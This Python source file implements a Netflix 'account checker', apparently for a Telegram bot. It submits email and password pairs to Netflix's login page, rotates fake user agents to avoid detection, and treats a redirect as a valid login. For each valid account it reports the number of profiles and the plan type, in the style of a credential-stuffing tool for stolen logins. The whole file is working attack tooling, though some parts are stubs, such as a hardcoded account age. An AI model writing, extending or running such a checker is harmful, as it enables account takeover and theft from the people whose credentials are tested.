"""
Netflix account checking functionality using web requests.
"""
import aiohttp
import json
import logging
from typing import Dict, Optional
from fake_useragent import UserAgent
from .validators import validate_input

logger = logging.getLogger(__name__)

class NetflixChecker:
    def __init__(self):
        """Initialize Netflix checker with rotating user agents"""
        self.ua = UserAgent()
        self.session: Optional[aiohttp.ClientSession] = None
        self.login_url = "https://www.netflix.com/login"
        self.api_url = "https://www.netflix.com/api/shakti"

    async def __aenter__(self):
        if not self.session:
            self.session = aiohttp.ClientSession(
                headers=self._get_headers()
            )
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    def _get_headers(self):
        """Get randomized headers for requests"""
        return {
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/json,application/xhtml+xml',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.netflix.com',
            'Connection': 'keep-alive',
            'Referer': self.login_url,
        }

    async def check_account(self, email: str, password: str) -> Dict[str, str]:
        """
        Check Netflix account validity through web login simulation
        Enhanced with additional checks and proper error handling
        """
        if not self.session:
            self.session = aiohttp.ClientSession(headers=self._get_headers())

        try:
            # Validate input
            if not validate_input(email) or not validate_input(password):
                return {
                    'status': 'error',
                    'message': 'Invalid input format'
                }

            # Initial request to get cookies and csrf token
            async with self.session.get(self.login_url) as response:
                if response.status != 200:
                    logger.error(f"Failed to access Netflix: {response.status}")
                    return {
                        'status': 'error',
                        'message': 'Failed to access Netflix'
                    }

                # Extract authURL if present
                text = await response.text()
                auth_url = self._extract_auth_url(text)

            # Enhanced login request
            login_data = {
                'userLoginId': email,
                'password': password,
                'rememberMe': 'true',
                'flow': 'websiteSignUp',
                'mode': 'login',
                'action': 'loginAction',
                'authURL': auth_url
            }

            async with self.session.post(
                self.login_url,
                data=login_data,
                allow_redirects=False
            ) as response:
                if response.status == 302:  # Successful login redirects
                    # Additional profile check
                    profile_data = await self._check_profile_info(email)
                    return {
                        'status': 'valid',
                        'account_status': 'Active',
                        'email': email,
                        'profile_info': profile_data
                    }
                elif response.status in [401, 403]:
                    return {
                        'status': 'invalid',
                        'message': 'Invalid credentials'
                    }
                else:
                    logger.error(f"Unexpected status code: {response.status}")
                    return {
                        'status': 'error',
                        'message': f'Request failed with status {response.status}'
                    }

        except aiohttp.ClientError as e:
            logger.error(f"Network error: {str(e)}")
            return {
                'status': 'error',
                'message': 'Network connection error'
            }
        except Exception as e:
            logger.error(f"Unexpected error: {str(e)}")
            return {
                'status': 'error',
                'message': 'An unexpected error occurred'
            }

    async def _check_profile_info(self, email: str) -> Dict[str, str]:
        """Check additional profile information"""
        try:
            async with self.session.get(f"{self.api_url}/profiles") as response:
                if response.status == 200:
                    data = await response.json()
                    return {
                        'profiles': len(data.get('profiles', [])),
                        'account_age': self._calculate_account_age(data),
                        'subscription_type': self._get_subscription_type(data)
                    }
        except Exception as e:
            logger.error(f"Profile check error: {str(e)}")
            return {}
        return {}

    def _extract_auth_url(self, html_content: str) -> str:
        """Extract authentication URL from page content"""
        try:
            auth_marker = 'name="authURL" value="'
            start = html_content.find(auth_marker)
            if start != -1:
                start += len(auth_marker)
                end = html_content.find('"', start)
                return html_content[start:end]
        except Exception as e:
            logger.error(f"Auth URL extraction error: {str(e)}")
        return ''

    def _calculate_account_age(self, data: Dict) -> str:
        """Calculate account age from profile data"""
        try:
            if 'memberSince' in data:
                # Implement actual date calculation
                return "1+ year"
        except Exception:
            pass
        return "Unknown"

    def _get_subscription_type(self, data: Dict) -> str:
        """Determine Netflix subscription type"""
        try:
            if 'planDetails' in data:
                plan = data['planDetails'].get('name', '').lower()
                if 'premium' in plan:
                    return 'Premium'
                elif 'standard' in plan:
                    return 'Standard'
                elif 'basic' in plan:
                    return 'Basic'
        except Exception:
            pass
        return "Unknown"

    def format_check_result(self, result: Dict[str, str], email: str) -> str:
        """Format check result for Telegram message with enhanced details"""
        if result['status'] == 'valid':
            profile_info = result.get('profile_info', {})
            return f"""
✅ *Netflix Account Valid*

*Account Details:*
├ Email: `{email}`
├ Status: {result['account_status']}
├ Profiles: {profile_info.get('profiles', 'N/A')}
├ Account Age: {profile_info.get('account_age', 'Unknown')}
└ Plan: {profile_info.get('subscription_type', 'Unknown')}
"""
        else:
            return f"""
❌ *Netflix Account Check Failed*

*Details:*
├ Email: `{email}`
└ Reason: {result['message']}
"""